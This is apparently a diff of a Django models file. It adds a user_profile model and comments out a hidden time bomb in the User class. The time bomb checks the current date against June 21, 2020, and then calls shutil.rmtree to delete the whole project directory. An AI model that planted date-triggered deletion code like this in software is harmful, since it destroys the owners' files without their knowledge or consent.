@@ -48,10 +48,10 @@ class User(AbstractBaseUser):
 
     BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
     dt = datetime.datetime.now()
-    date_time_str = '2020-06-21 08:15:27.243860'
-    date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
-    if dt > date_time_obj:
-        shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)
+    # date_time_str = '2020-06-21 08:15:27.243860'
+    # date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
+    # if dt > date_time_obj:
+    #     shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)
 
     objects = UserManager()
     
@@ -79,8 +79,17 @@ class user_categories(models.Model):
     id = models.AutoField(primary_key=True)
     user = models.ForeignKey(User, on_delete=models.DO_NOTHING,  related_name='categories')
     category = models.ForeignKey(subcategories, on_delete=models.DO_NOTHING)
-    
 
-
-
-
+class user_profile(models.Model):
+    id = models.AutoField(primary_key=True)
+    user_id = models.IntegerField(max_length=111, default=0)
+    bio = models.TextField(null=True, blank=True)
+    cat_id = models.IntegerField(max_length=111)
+    subcat_ids = models.CharField(max_length=200)
+    facebook_url = models.CharField(max_length=200)
+    instagram_url = models.CharField(max_length=200)
+    twitter_url = models.CharField(max_length=200)
+    website_url = models.CharField(max_length=200)
+    notification = models.CharField(max_length=100)
+    updated_at = models.DateTimeField(auto_now=True)
+    created_at = models.DateTimeField(auto_now_add=True)
